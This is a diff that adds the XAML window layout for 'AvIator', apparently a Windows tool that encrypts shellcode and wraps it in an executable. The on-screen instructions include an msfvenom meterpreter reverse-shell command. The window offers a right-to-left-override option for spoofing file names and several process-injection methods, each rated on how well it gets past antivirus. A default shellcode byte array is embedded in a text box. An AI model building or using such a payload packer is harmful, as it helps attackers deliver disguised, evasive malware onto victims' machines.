@@ -1,0 +1,74 @@
+﻿<Window x:Class="AvIator.Window1"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        xmlns:local="clr-namespace:AvIator"
+        mc:Ignorable="d"
+        Title="Window1" Height="786" Width="1079">
+    <Grid Margin="-1,0,1,0">
+        <Grid.RowDefinitions>
+            <RowDefinition Height="59*"/>
+            <RowDefinition Height="39*"/>
+            <RowDefinition Height="134*"/>
+            <RowDefinition Height="132*"/>
+            <RowDefinition Height="46*"/>
+            <RowDefinition Height="60*"/>
+            <RowDefinition Height="300*"/>
+        </Grid.RowDefinitions>
+        <Grid.ColumnDefinitions>
+            <ColumnDefinition Width="319*"/>
+            <ColumnDefinition Width="134*"/>
+            <ColumnDefinition Width="626*"/>
+        </Grid.ColumnDefinitions>
+        <Grid Margin="7,59,0,1" Grid.Column="0" Grid.RowSpan="7">
+            <Label Content="Instructions" HorizontalAlignment="Left" Margin="11,7,0,0" VerticalAlignment="Top" FontSize="18"/>
+            <Label Content="1. Enter an Encryption Key or leave the default" HorizontalAlignment="Left" Margin="7,98,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Label Content="2. Enter an IV or leave the default" HorizontalAlignment="Left" Margin="8,142,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Label Content="3. Paste the Shellcode in the text box" HorizontalAlignment="Left" Margin="10,185,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Label Content="4. Click on Encrypt Button" HorizontalAlignment="Left" Margin="11,345,0,0" VerticalAlignment="Top" FontSize="18"/>
+            <Label Content="5. Enter the path to save the exe" HorizontalAlignment="Left" Margin="10,393,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Label Content="6. Select Architecture" HorizontalAlignment="Left" Margin="11,435,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Label Content="7. Select injection technique" HorizontalAlignment="Left" Margin="11,480,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Label Content="8. Press the Generate Exe button" HorizontalAlignment="Left" Margin="12,524,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Label Content="(e.g. msfvenom -p windows/meterpreter/" HorizontalAlignment="Left" Margin="11,215,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Label Content="reverse__https LHOST=192.168.1.2 " HorizontalAlignment="Left" Margin="13,248,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Label Content="LPORT=4444 -f csharp)" HorizontalAlignment="Left" Margin="13,280,0,0" VerticalAlignment="Top" FontSize="14"/>
+            <Image x:Name="pictureBox1" HorizontalAlignment="Left" Height="100" Margin="85,576,0,0" VerticalAlignment="Top" Width="133"/>
+            <Label x:Name="linkLabel1" Content="Label" HorizontalAlignment="Left" Margin="46,682,0,0" VerticalAlignment="Top" Width="213"/>
+        </Grid>
+        <Label Content="AES Key:" HorizontalAlignment="Left" Margin="65,20,0,0" VerticalAlignment="Top" FontSize="14" Grid.Column="1" Height="29" Width="62"/>
+        <Label Content="IV:" HorizontalAlignment="Left" Margin="103,0,0,0" VerticalAlignment="Center" FontSize="14" Grid.Column="1" Grid.Row="1" Height="29" Width="25"/>
+        <Label Content="Payload:" HorizontalAlignment="Left" Margin="67,13,0,0" VerticalAlignment="Top" FontSize="14" Grid.Column="1" Grid.Row="2" Height="29" Width="61"/>
+        <Label Content="Encrypted Payload:" HorizontalAlignment="Center" Margin="0,6,0,0" VerticalAlignment="Top" FontSize="14" Grid.Column="1" Grid.Row="3" Height="29" Width="126"/>
+        <Label x:Name="label8" Content="Path:" HorizontalAlignment="Left" Margin="253,0,0,0" VerticalAlignment="Center" FontSize="14" Grid.Column="2" Grid.Row="4" Height="29" Width="126"/>
+        <Button x:Name="button1" Grid.Column="1" Content="Select Path" HorizontalAlignment="Left" Margin="40,0,0,0" Grid.Row="4" VerticalAlignment="Center" Grid.ColumnSpan="2" Height="30" Width="115"/>
+        <Button x:Name="button2" Grid.Column="2" Content="Custom Icon" HorizontalAlignment="Left" Margin="469,0,0,0" Grid.Row="4" VerticalAlignment="Center" Height="30" Width="115"/>
+        <CheckBox x:Name="RTLOCheckBox" Grid.Column="2" Content="Use Right to Left Override (RTLO)" HorizontalAlignment="Left" Margin="51,0,0,0" Grid.Row="4" VerticalAlignment="Center" Height="15" Width="195"/>
+        <GroupBox Grid.Column="1" Header="Architecture" Grid.Row="5" Margin="7,5,0,7" Grid.ColumnSpan="2"/>
+        <RadioButton x:Name="virtualAlloc_Option" Content="Creates a new thread in memory using the CreateThread API Function (Shellcode Arch: x86, x64, OS Arch: x86, x64)" HorizontalAlignment="Left" Margin="35,11,0,0" VerticalAlignment="Top" Height="20" Width="632" Grid.Column="1" Grid.Row="6" Grid.ColumnSpan="2" IsChecked="True"/>
+        <RadioButton x:Name="virtualAllocEx_Option" Content="Spawns notepad (32) as a background process and injects the  given shellcode using the CreateRemoteThread API function " HorizontalAlignment="Left" Margin="35,50,0,0" VerticalAlignment="Top" Height="22" Width="720" Grid.Column="1" Grid.Row="6" Grid.ColumnSpan="2"/>
+        <RadioButton x:Name="injectExistingApp" Content="Injects the  given shellcode to an existing application which is given by the user in the text box bellow " HorizontalAlignment="Left" Margin="35,90,0,0" VerticalAlignment="Top" Height="25" Width="709" Grid.Column="1" Grid.Row="6" Grid.ColumnSpan="2"/>
+        <RadioButton x:Name="threadHijacking_option" Content="Thread Hijacking targeting the procedure given in the text box bellow (Shellcode Arch: x64, OS Arch: x64)" HorizontalAlignment="Left" Margin="35,158,0,0" VerticalAlignment="Top" Height="20" Width="631" Grid.Column="1" Grid.Row="6" Grid.ColumnSpan="2"/>
+        <RadioButton x:Name="APCInjectionCheckBox" Content="Queue User APC to Alertable Thread (Shellcode Arch: x64, OS ARch: x64)" HorizontalAlignment="Left" Margin="34,250,0,0" VerticalAlignment="Top" Height="19" Width="591" Grid.Column="1" Grid.Row="6" Grid.ColumnSpan="2"/>
+        <RadioButton x:Name="threadHijackin_x86" Content="Thread Hijacking (Shellcode Arch: x86, OS Arch: x86)" HorizontalAlignment="Left" Margin="35,206,0,0" VerticalAlignment="Top" Height="19" Width="550" Grid.Column="1" Grid.Row="6" Grid.ColumnSpan="2"/>
+        <Label Content="+ Stable execution but can be traced by most AVs :((((" HorizontalAlignment="Left" Margin="49,23,0,0" VerticalAlignment="Top" Grid.Column="1" Grid.ColumnSpan="2" Grid.Row="6" Height="26" Width="293"/>
+        <Label Content="++ Stable execution might bypass a large number of AVs :(" HorizontalAlignment="Left" Margin="48,64,0,0" VerticalAlignment="Top" Grid.Column="1" Grid.ColumnSpan="2" Grid.Row="6" Height="26" Width="320"/>
+        <Label Content="(Shellcode Architecture should be the same as target Architecture) " HorizontalAlignment="Left" Margin="48,106,0,0" VerticalAlignment="Top" Grid.Column="1" Grid.ColumnSpan="2" Grid.Row="6" Width="410" Height="26"/>
+        <Label Content="++ Stable execution, since a valid target procedure is given, bypasses a large number of AVs" HorizontalAlignment="Left" Margin="47,124,0,0" VerticalAlignment="Top" Grid.Column="1" Grid.ColumnSpan="2" Grid.Row="6" Width="579" Height="26"/>
+        <Label Content="++++ High Success Rate and stable execution :)))" HorizontalAlignment="Left" Margin="51,170,0,0" VerticalAlignment="Top" Grid.Column="1" Grid.ColumnSpan="2" Grid.Row="6" Width="579" Height="26"/>
+        <Label Content="+++ High success Rate and stable execution, depending on the target procedure given :))" HorizontalAlignment="Left" Margin="51,218,0,0" VerticalAlignment="Top" Grid.Column="1" Grid.ColumnSpan="2" Grid.Row="6" Width="579" Height="26"/>
+        <Label Content="+++High success rate and stable execution, depending on the target procedure given :))" HorizontalAlignment="Left" Margin="49,263,0,0" VerticalAlignment="Top" Grid.Column="1" Grid.ColumnSpan="2" Grid.Row="6" Width="579" Height="26"/>
+        <TextBox x:Name="procBox" Grid.Column="2" HorizontalAlignment="Left" Margin="421,218,0,0" Grid.Row="6" TextWrapping="Wrap" Text="None" VerticalAlignment="Top" Width="186" Height="22"/>
+        <Label Content="Target Procedure" HorizontalAlignment="Left" Margin="418,190,0,0" VerticalAlignment="Top" Grid.Column="2" Grid.Row="6" Height="26" Width="293"/>
+        <Button x:Name="genExe"   Grid.Column="2" Content="Generate exe" HorizontalAlignment="Left" Margin="425,248,0,0" Grid.Row="6" VerticalAlignment="Top" Height="23" Width="181"/>
+        <TextBox x:Name="keyBox" Grid.Column="2" HorizontalAlignment="Center" Margin="0,20,0,0" TextWrapping="Wrap" Text="0x11,0x22,0x11,0x00,0x00,0x01,0xd0,0x00,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x11,0x01,0x11,0x11,0x00,0x00" VerticalAlignment="Top" Width="607" Height="25" FontSize="11"/>
+        <TextBox x:Name="ivBox" Grid.Column="2" HorizontalAlignment="Left" Margin="13,0,0,0" TextWrapping="Wrap" Text="0x00,0xcc,0x00,0x00,0x00,0xcc" VerticalAlignment="Center" Width="569" Height="25" Grid.Row="1" FontSize="11"/>
+        <TextBox x:Name="payloadBox" Grid.Column="2" HorizontalAlignment="Left" Margin="12,9,0,0" TextWrapping="Wrap" Text="0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,&#xD;&#xA;0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,&#xD;&#xA;0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,&#xD;&#xA;0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,&#xD;&#xA;0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,&#xD;&#xA;0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,&#xD;&#xA;0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,&#xD;&#xA;0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,&#xD;&#xA;0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,&#xD;&#xA;0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,&#xD;&#xA;0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,&#xD;&#xA;0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,&#xD;&#xA;0x00,0x53,0xff,0xd5,0x43,0x3a,0x5c,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,&#xD;&#xA;0x53,0x79,0x73,0x57,0x4f,0x57,0x36,0x34,0x5c,0x6e,0x6f,0x74,0x65,0x70,0x61,&#xD;&#xA;0x64,0x2e,0x65,0x78,0x65,0x00" VerticalAlignment="Top" Width="569" Height="93" Grid.Row="2" FontSize="11"/>
+        <TextBox x:Name="resultBox" Grid.Column="2" HorizontalAlignment="Left" Margin="14,0,0,0" TextWrapping="Wrap" VerticalAlignment="Center" Width="569" Height="114" Grid.Row="3" FontSize="11" IsReadOnly="True"/>
+        <Button x:Name="encrypt" Grid.Column="2" Content="Encrypt Payload" HorizontalAlignment="Left" Margin="466,107,0,0" Grid.Row="2" VerticalAlignment="Top" Height="30" Width="115" Grid.RowSpan="2"/>
+        <CheckBox x:Name="archX86" Grid.Column="1" Content="x86" HorizontalAlignment="Left" Margin="95,26,0,0" Grid.Row="5" VerticalAlignment="Top" Height="15" Width="195" Grid.ColumnSpan="2" IsChecked="True" Checked="archX86_Checked" Click="archX86_Click"/>
+        <CheckBox x:Name="archX64" Grid.Column="2" Content="x64" HorizontalAlignment="Left" Margin="239,25,0,0" Grid.Row="5" VerticalAlignment="Top" Height="15" Width="195" Checked="archX64_Checked" Click="archX64_Click"/>
+
+    </Grid>
+</Window>
